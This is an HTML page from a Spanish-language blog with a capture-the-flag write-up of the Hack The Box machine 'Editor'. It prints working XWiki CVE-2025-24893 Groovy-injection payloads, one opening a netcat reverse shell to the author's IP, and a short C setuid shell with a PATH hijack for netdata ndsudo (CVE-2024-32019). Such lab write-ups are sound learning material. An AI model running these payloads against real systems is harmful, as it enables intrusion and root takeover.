@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>HTB: Editor | Bl0g!</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta name="description" content="Algunas notas sobre la máquina Editor de Hack The Box 🔗Acceso 🔗La intrusión la realicé aprovechando la vulnerabilidad CVE-2025-24893 en la página web. Después de analizar este PoC, comencé a probar con distintos payloads:
+# CVE-2025-24893
+http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=}}}{{async async=false}}{{groovy}}println(&#34;cat /etc/passwd&#34;.execute().text){{/groovy}}{{/async}}
+
+http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=}}}{{async async=false}}{{groovy}}println(&#34;whoami&#34;.execute().text){{/groovy}}{{/async}}
+
+http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=}}}{{async async=false}}{{groovy}}println(&#34;busybox nc 10.10.15.14 443 -e bash&#34;.execute().text){{/groovy}}{{/async}}
+Esto me dio acceso al equipo como el usuario xwiki.
+
+Reseteo de contraseña para el usuario neal 🔗Buscando credenciales, encontré en /var/lib/xwiki/data/mails/ que, si desde la web se hacía una petición para cambiar la clave de un usuario válido, el sistema enviaba un correo con un link para restablecer la contraseña.">
+<meta name="generator" content="Hugo 0.148.2">
+
+
+  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+	
+		<a href="/"> <span class="arrow">←</span>Home</a>
+	
+	<a href="/posts">Archive</a>
+	<a href="/tags">Tags</a>
+	<a href="/about">About</a>
+
+	
+
+	
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">HTB: Editor</h1>
+
+    <div class="tip">
+        <time datetime="2025-08-06 15:26:48 &#43;0000 UTC">Aug 6, 2025</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          236 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          2 minute read
+        </span>
+    </div>
+
+    
+    
+        
+  
+    <aside class="toc">
+      <details>
+          <summary>Table of Contents
+          </summary>
+          <div>
+              <nav id="TableOfContents">
+  <ul>
+    <li><a href="#acceso">Acceso</a></li>
+    <li><a href="#reseteo-de-contraseña-para-el-usuario-neal">Reseteo de contraseña para el usuario <code>neal</code></a>
+      <ul>
+        <li><a href="#link-de-ejemplo-que-envia-el-sistema">Link de ejemplo que envia el sistema</a></li>
+      </ul>
+    </li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+          </div>
+      </details>
+    </aside>
+  
+
+
+    
+
+
+    <div class="content">
+      <h1 id="algunas-notas-sobre-la-máquina-editor-de-hack-the-box">Algunas notas sobre la máquina <a href="https://app.hackthebox.com/machines/684" target="_blank" rel="noopener">Editor</a> de <a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box</a> <a href="#algunas-notas-sobre-la-m%c3%a1quina-editor-de-hack-the-box" class="anchor">🔗</a></h1><h2 id="acceso">Acceso <a href="#acceso" class="anchor">🔗</a></h2><p>La intrusión la realicé aprovechando la vulnerabilidad <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24893" target="_blank" rel="noopener">CVE-2025-24893</a> en la página web. Después de analizar este <a href="https://www.exploit-db.com/exploits/52136" target="_blank" rel="noopener">PoC</a>, comencé a probar con distintos payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># CVE-2025-24893</span>
+</span></span><span style="display:flex;"><span>http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media<span style="color:#f92672">=</span>rss&amp;text<span style="color:#f92672">=}}}{{</span>async async<span style="color:#f92672">=</span>false<span style="color:#f92672">}}{{</span>groovy<span style="color:#f92672">}}</span>println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span>.execute<span style="color:#f92672">()</span>.text<span style="color:#f92672">){{</span>/groovy<span style="color:#f92672">}}{{</span>/async<span style="color:#f92672">}}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media<span style="color:#f92672">=</span>rss&amp;text<span style="color:#f92672">=}}}{{</span>async async<span style="color:#f92672">=</span>false<span style="color:#f92672">}}{{</span>groovy<span style="color:#f92672">}}</span>println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;whoami&#34;</span>.execute<span style="color:#f92672">()</span>.text<span style="color:#f92672">){{</span>/groovy<span style="color:#f92672">}}{{</span>/async<span style="color:#f92672">}}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media<span style="color:#f92672">=</span>rss&amp;text<span style="color:#f92672">=}}}{{</span>async async<span style="color:#f92672">=</span>false<span style="color:#f92672">}}{{</span>groovy<span style="color:#f92672">}}</span>println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;busybox nc 10.10.15.14 443 -e bash&#34;</span>.execute<span style="color:#f92672">()</span>.text<span style="color:#f92672">){{</span>/groovy<span style="color:#f92672">}}{{</span>/async<span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>Esto me dio acceso al equipo como el usuario <code>xwiki</code>.</p>
+<hr>
+<h2 id="reseteo-de-contraseña-para-el-usuario-neal">Reseteo de contraseña para el usuario <code>neal</code> <a href="#reseteo-de-contrase%c3%b1a-para-el-usuario-neal" class="anchor">🔗</a></h2><p>Buscando credenciales, encontré en <strong>/var/lib/xwiki/data/mails/</strong> que, si desde la web se hacía una petición para cambiar la clave de un usuario válido, el sistema enviaba un correo con un link para restablecer la contraseña.</p>
+<p>Así fue como pude cambiar la clave del usuario <code>neal</code> y acceder a la wiki. Dentro del servicio no encontré nada útil, pero me pareció interesante ver cómo funciona por detrás esta parte del sistema.</p>
+<h3 id="link-de-ejemplo-que-envia-el-sistema">Link de ejemplo que envia el sistema <a href="#link-de-ejemplo-que-envia-el-sistema" class="anchor">🔗</a></h3><pre tabindex="0"><code>http://editor.htb:8080/xwiki/authenticate/wiki/xwiki/resetpassword?u=xwiki:XWiki.neal&amp;v=BpqfjCA4Ig0NvmvmoduOVq05oUkX7z
+</code></pre><hr>
+<h2 id="root">Root <a href="#root" class="anchor">🔗</a></h2><p>Una vez dentro del equipo como el usuario <code>oliver</code>, listé los binarios con permisos SUID y me llamó la atención esta línea:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4400 -type f 2&gt;/dev/null 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --&gt; /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span>
+</span></span></code></pre></div><p>Buscando información, encontré el <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32019" target="_blank" rel="noopener">CVE-2024-32019</a> y estas páginas que explican cómo explotarlo:</p>
+<ul>
+<li><a href="https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93" target="_blank" rel="noopener">netdata</a></li>
+<li><a href="https://sploitus.com/exploit?id=5077683C-F7E6-58BE-9375-B5A13A8782C5" target="_blank" rel="noopener">sploitus</a></li>
+</ul>
+<p>Entonces cree el archivo poc.c con el siguiente contenido</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setuid</span>(<span style="color:#a6e22e">geteuid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>lo compile</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc poc.c -o nvme
+</span></span></code></pre></div><p>y finalmente, ejecuté el siguiente comando para convertirme en <code>root</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># CVE-2024-32019</span>
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+</span></span></code></pre></div><p>saludos!!</p>
+
+    </div>
+
+    
+    
+    
+
+</section>
+
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/pgraffigna" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="https://www.linkedin.com/in/pablo-graffigna/" rel="me" target="_blank">
+        
+        <svg width="28" height="28" fill="#bbbbbb" viewBox="0 0 500 500">
+  <g fill="none" fill-rule="evenodd">
+    <rect width="500" height="500" fill="#bbbbbb" rx="50"/>
+    <path fill="#FFF" d="M154.703 100.183c-19.121 0-34.689 15.565-34.703 34.701 0 19.136 15.568 34.704 34.703 34.704 19.128 0 34.688-15.568 34.688-34.704 0-19.134-15.561-34.701-34.688-34.701zm26.045 83.348h-52.094a4.488 4.488 0 0 0-4.488 4.489v167.675a4.488 4.488 0 0 0 4.488 4.488h52.093a4.49 4.49 0 0 0 4.489-4.488V188.02a4.486 4.486 0 0 0-4.488-4.489zm133.176-1.974c-19.064 0-35.817 5.805-46.04 15.271v-8.808c0-2.48-2.01-4.489-4.489-4.489h-49.971a4.489 4.489 0 0 0-4.489 4.489v167.675a4.488 4.488 0 0 0 4.489 4.488h52.044a4.49 4.49 0 0 0 4.489-4.488v-82.957c0-23.802 4.378-38.555 26.227-38.555 21.526.026 23.137 15.846 23.137 39.977v81.535a4.489 4.489 0 0 0 4.49 4.488h52.068a4.489 4.489 0 0 0 4.488-4.488v-91.977c-.001-38.253-7.553-82.161-66.443-82.161z"/>
+  </g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+        © Copyright 2025 pgraffigna
+    
+    </div>
+
+    
+</footer>
+
+
+
+  </body>
+</html>
